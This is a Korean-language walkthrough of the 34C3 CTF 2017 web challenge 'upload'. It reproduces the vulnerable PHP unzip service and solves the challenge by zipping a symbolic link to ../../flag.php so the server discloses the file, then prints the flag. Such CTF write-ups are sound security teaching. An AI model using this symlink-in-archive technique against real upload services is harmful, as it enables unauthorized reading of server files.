# [2017_34C3CTF] \[WEB] upload

## Key words

* Symbolic link

## Description

```
This is an useful service to unzip some files.

We added a flag for your convenience.
```

## Solution

`http://35.197.205.153/flag.php`에 소스코드로 플래그가 존재합니다.

```php
<?php
$UPLOADS = '/var/www/uploads/';
if(!empty($_FILES['uploaded_file'])) {
    $paths = scandir($UPLOADS);
    $now = time();
    foreach($paths as $path) {
        if ($path == '.') {
            continue;
        }
        $mtime = filemtime($UPLOADS . $path);
        if ($now - $mtime > 120) {
            shell_exec('rm -rf ' . $UPLOADS . $path);
        }
    }
    $path = $UPLOADS . uniqid('upl') . '/';
    if(!mkdir($path, 0777, true)) {
        die('mkdir failed');
    }
    $zip = $path . uniqid('zip');
    if(move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $zip)) {
        shell_exec('unzip -j -n ' . $zip . ' -d ' . $path);
        unlink($zip);
        header('Location: uploads/'. basename($path) . '/');
    } else {
        echo 'There was an error uploading the file, please try again!';
    }
} else {
?>
<!DOCTYPE html>
<html>
<head>
    <title>Upload your files</title>
</head>
<body>
<?php
    if (@$_GET['source']) {
        highlight_file(__FILE__);
    } else {
?>
    <form enctype="multipart/form-data" method="POST">
        <p>Upload your file</p>
        <input type="file" name="uploaded_file"></input><br />
        <input type="submit"></input>
    </form>
    <a href="?source=1">Show source</a>
</body>
</html>
<?php
    }
}
?>
```

php 소스코드가 주어지며, zip 파일을 업로드하면 이를 압축 해제하여 저장해주는 기능을 제공합니다. `flag.php`를 읽어와야 하는데 크게 두가지 방법이 있습니다. 첫째는 php 파일을 업로드하는 것이고, 둘째는 심볼릭링크를 이용하는 것입니다. 웹쉘을 업로드하여 접속해보면 업로드 디렉토리에는 실행 권한이 없어서 웹쉘이 실행되는 것이 아니라 다운로드됩니다.

```
$ ln -s ../../flag.php ddd
lrwxr-xr-x  1 delspon  staff   14  1  1 11:00 ddd -> ../../flag.php
```

위처럼 `flag.php`에 심볼릭 링크를 건 후, 압축하여 업로드하면 flag.php를 읽어올 수 있습니다.

```php
<?php
$flag = "34C3_unpack_th3_M1ss1ng_l!nk"
?>
```

